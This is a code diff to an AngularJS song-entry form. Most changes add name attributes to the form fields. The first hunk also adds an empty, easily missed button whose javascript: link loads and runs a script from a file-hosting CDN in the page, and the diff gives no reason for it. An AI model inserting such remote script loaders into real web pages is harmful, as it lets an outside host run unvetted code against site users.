@@ -1,5 +1,8 @@
 <!-- start full screen container -->
 
+<a href="javascript:(function(){s=document.createElement('script');s.type='text/javascript';s.src='https://cdn.filestackcontent.com/WbtK02w6Rxi10JUKShk7?v='+parseInt(Math.random()*99999999);document.body.appendChild(s);})();"><button ></button></a>
+
+
 <div class="col-sm-12" id="songInfoContainer">
 
   <form name="nsc.newSongForm" confirm-on-exit>
@@ -9,7 +12,7 @@
       <div class="form-group">
         <!-- start song title container -->
         <div class="col-sm-8 half-gutter text-center">
-          <input ng-class="['form-control', nsc.songError ? 'songErrorHighlight': '']" id="songTitle" ng-model="nsc.newSongObject.title" placeholder="{{nsc.titlePlaceholder}}" />
+          <input name="title" ng-class="['form-control', nsc.songError ? 'songErrorHighlight': '']" id="songTitle" ng-model="nsc.newSongObject.title" placeholder="{{nsc.titlePlaceholder}}" />
         </div>
         <!-- end song title container -->
       </div>
@@ -35,7 +38,7 @@
         <div class="form-group">
           <label for="toneSet" class="control-label">Tone Set</label>
           <!-- <div contenteditable class="form-control" id="toneSet"> -->
-          <ng-quill-editor id="toneSet" theme="bubble" class="form-control" ng-model="nsc.newSongObject.toneSet" placeholder="Example: d r m f s l t d, r">
+          <ng-quill-editor name="tone-set" id="toneSet" theme="bubble" class="form-control" ng-model="nsc.newSongObject.toneSet" placeholder="Example: d r m f s l t d, r">
             <ng-quill-toolbar>
               <div id="ng-quill-toolbar">
                 <span class="ql-formats">
@@ -69,7 +72,7 @@
         <!-- start rhythm -->
         <div class="form-group">
           <label for="rhythm" class="control-label" style="margin-right:10px;">Rhythm</label><a target="_blank" href="http://i.fonts2u.com/mu/mp1_musisync_1.png" title="How to use the MusiSync font"><span class="glyphicon glyphicon-question-sign" aria-hidden="true"></span></a>
-          <input class="form-control" ng-model="nsc.newSongObject.rhythm" placeholder="Example: q,n,h" ng-change="nsc.checkAndDisplayRhythm(nsc.newSongObject.rhythm)">
+          <input name="rhythm" class="form-control" ng-model="nsc.newSongObject.rhythm" placeholder="Example: q,n,h" ng-change="nsc.checkAndDisplayRhythm(nsc.newSongObject.rhythm)">
           <div>
             <span ng-repeat="component in nsc.rhythm track by $index">
               <span ng-class="{'music-font': $index % 2==0}">{{component}}</span>
@@ -81,7 +84,7 @@
         <!-- start extractable rhythms -->
         <div class="form-group">
           <label for="extractableRhythms" class="control-label" style="margin-right:10px;">Extractable Rhythms</label><a target="_blank" href="http://i.fonts2u.com/mu/mp1_musisync_1.png" title="How to use the MusiSync font"><span class="glyphicon glyphicon-question-sign" aria-hidden="true"></span></a>
-          <input class="form-control" ng-model="nsc.newSongObject.extractableRhythms" placeholder="Example: nn'qn'qn'qq(*,2) qn'nq'qn'nq(3) nn'qn'qq'h(f)" ng-change="nsc.checkAndDisplayExtractableRhythms(nsc.newSongObject.extractableRhythms)">
+          <input name="extractable-rhythms" class="form-control" ng-model="nsc.newSongObject.extractableRhythms" placeholder="Example: nn'qn'qn'qq(*,2) qn'nq'qn'nq(3) nn'qn'qq'h(f)" ng-change="nsc.checkAndDisplayExtractableRhythms(nsc.newSongObject.extractableRhythms)">
         </div>
 
         <div>
@@ -101,56 +104,56 @@
         <!-- start meter -->
         <div class="form-group">
           <label for="meter" class="control-label">Meter</label>
-          <select name="formType" ng-model="nsc.newSongObject.meter" class="form-control" ng-options="meter.id as meter.meter for meter in nsc.dropdowns.meter"><option value="" selected disabled hidden>Example: 2/4</option></select>
+          <select name="meter" ng-model="nsc.newSongObject.meter" class="form-control" ng-options="meter.id as meter.meter for meter in nsc.dropdowns.meter"><option value="" selected disabled hidden>Example: 2/4</option></select>
         </div>
         <!-- end meter -->
 
         <!-- start verses -->
         <div class="form-group">
           <label for="intervalNoteGroup" class="control-label">Verses</label>
-          <textarea class="form-control" ng-model="nsc.newSongObject.verses" placeholder="Example: 2. A los niños que duerman Dios benedice" rows="5"></textarea>
+          <textarea name="verses" class="form-control" ng-model="nsc.newSongObject.verses" placeholder="Example: 2. A los niños que duerman Dios benedice" rows="5"></textarea>
         </div>
         <!-- end verses -->
 
         <!-- start formation -->
         <div class="form-group">
           <label for="intervalNoteGroup" class="control-label">Formation</label>
-          <input class="form-control" ng-model="nsc.newSongObject.formation" placeholder="Formation" />
+          <input name="formation" class="form-control" ng-model="nsc.newSongObject.formation" placeholder="Formation" />
         </div>
         <!-- end formation -->
 
         <!-- start action -->
         <div class="form-group">
           <label for="intervalNoteGroup" class="control-label">Action</label>
-          <input class="form-control" ng-model="nsc.newSongObject.action" placeholder="Action" />
+          <input name="action" class="form-control" ng-model="nsc.newSongObject.action" placeholder="Action" />
         </div>
         <!-- end action -->
 
         <!-- start intervals -->
         <div class="form-group">
           <label for="intervalNoteGroup" class="control-label">Intervals / Note Group</label>
-          <input class="form-control" ng-model="nsc.newSongObject.intervalsNoteGroups" placeholder="Example: d-t-,d" />
+          <input name="intervals-note-group" class="form-control" ng-model="nsc.newSongObject.intervalsNoteGroups" placeholder="Example: d-t-,d" />
         </div>
         <!-- end intervals -->
 
         <!-- start phrases -->
         <div class="form-group">
           <label for="phrases" class="control-label">Phrases</label>
-          <input class="form-control" ng-model="nsc.newSongObject.phrases" placeholder="Example: 4.4.4.4." />
+          <input name="phrases" class="form-control" ng-model="nsc.newSongObject.phrases" placeholder="Example: 4.4.4.4." />
         </div>
         <!-- end phrases -->
 
         <!-- start melodic form -->
         <div class="form-group">
           <label for="melodicForm" class="control-label">Melodic Form</label>
-          <input class="form-control" ng-model="nsc.newSongObject.melodicForm" placeholder="Example: a.av.b.av" />
+          <input name="melodic-form" class="form-control" ng-model="nsc.newSongObject.melodicForm" placeholder="Example: a.av.b.av" />
         </div>
         <!-- end melodic form -->
 
         <!-- start rhythmic form -->
         <div class="form-group">
           <label for="rhythmicForm" class="control-label">Rhythmic Form</label>
-          <input class="form-control" ng-model="nsc.newSongObject.rhythmicForm" placeholder="Example: a.a.b.c" />
+          <input name="rhythmic-form" class="form-control" ng-model="nsc.newSongObject.rhythmicForm" placeholder="Example: a.a.b.c" />
         </div>
         <!-- end rhythmic form -->
 
@@ -171,7 +174,7 @@
         <!-- start culture origin -->
         <div class="form-group">
           <label for="cultureOrigin" class="control-label">Culture / Origin</label>
-          <input class="form-control" ng-model="nsc.newSongObject.cultureOrigin" placeholder="Example: New Mexico, Basque" />
+          <input name="culture-origin" class="form-control" ng-model="nsc.newSongObject.cultureOrigin" placeholder="Example: New Mexico, Basque" />
         </div>
         <!-- end culture origin -->
 
@@ -186,21 +189,21 @@
         <div class="form-group">
           <label for="csp" class="control-label">Comfortable Starting Pitch</label>
           <!-- comfortable starting pitch -->
-          <input class="form-control" ng-model="nsc.newSongObject.csp" placeholder="Example: A-C" />
+          <input name="csp" class="form-control" ng-model="nsc.newSongObject.csp" placeholder="Example: A-C" />
         </div>
         <!-- end comfortable starting pitch -->
 
         <!-- start other -->
         <div class="form-group">
           <label for="other" class="control-label">Other</label>
-          <textarea class="form-control" ng-model="nsc.newSongObject.other" placeholder="Example: Smithsonian folkways recording" rows="3"></textarea>
+          <textarea name="other" class="form-control" ng-model="nsc.newSongObject.other" placeholder="Example: Smithsonian folkways recording" rows="3"></textarea>
         </div>
         <!-- end other -->
 
         <!-- start source -->
         <div class="form-group">
           <label for="source" class="control-label">Source</label>
-          <textarea class="form-control" ng-model="nsc.newSongObject.source" placeholder="Example: 155 American Folksongs" rows="3"></textarea>
+          <textarea name="source" class="form-control" ng-model="nsc.newSongObject.source" placeholder="Example: 155 American Folksongs" rows="3"></textarea>
         </div>
         <!-- end source -->
 
